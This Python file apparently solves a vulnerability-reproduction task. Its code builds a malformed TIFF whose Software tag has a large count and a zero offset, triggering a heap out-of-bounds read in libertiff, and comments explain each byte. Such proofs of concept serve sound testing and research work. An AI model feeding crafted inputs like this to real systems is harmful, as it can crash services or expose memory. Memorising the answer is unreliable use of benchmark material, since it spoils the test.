import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in libertiff.
        The vulnerability is caused by invalid offline tags with a value offset of zero.
        """
        # TIFF Header (Little Endian)
        # Bytes 0-1: Byte Order 'II' (0x4949)
        # Bytes 2-3: Version 42 (0x002A)
        # Bytes 4-7: Offset to first IFD (8)
        poc = bytearray(b'\x49\x49\x2A\x00\x08\x00\x00\x00')
        
        # IFD (Image File Directory) starts at offset 8
        # Number of Directory Entries: 1
        poc += struct.pack('<H', 1)
        
        # Directory Entry 1:
        # Tag: 0x0131 (Software) - Uses ASCII type, commonly parsed
        # Type: 2 (ASCII)
        # Count: 0x1000 (4096) - Large enough to exceed the file size significantly
        # Value/Offset: 0 - The vulnerability trigger.
        #
        # Explanation:
        # Since Count * TypeSize (4096 * 1) > 4 bytes, the Value field is interpreted as an offset.
        # Setting the offset to 0 points to the beginning of the file.
        # The vulnerable parser attempts to read 'Count' bytes from 'Offset'.
        # Since the file is small (~26 bytes) and Count is large (4096), this triggers a
        # Heap Buffer Overflow (Out-of-Bounds Read) on the file content buffer.
        tag_id = 0x0131
        tag_type = 2
        tag_count = 0x1000
        tag_offset = 0
        
        poc += struct.pack('<HHII', tag_id, tag_type, tag_count, tag_offset)
        
        # Offset to next IFD: 0 (End of IFD chain)
        poc += struct.pack('<I', 0)
        
        return bytes(poc)
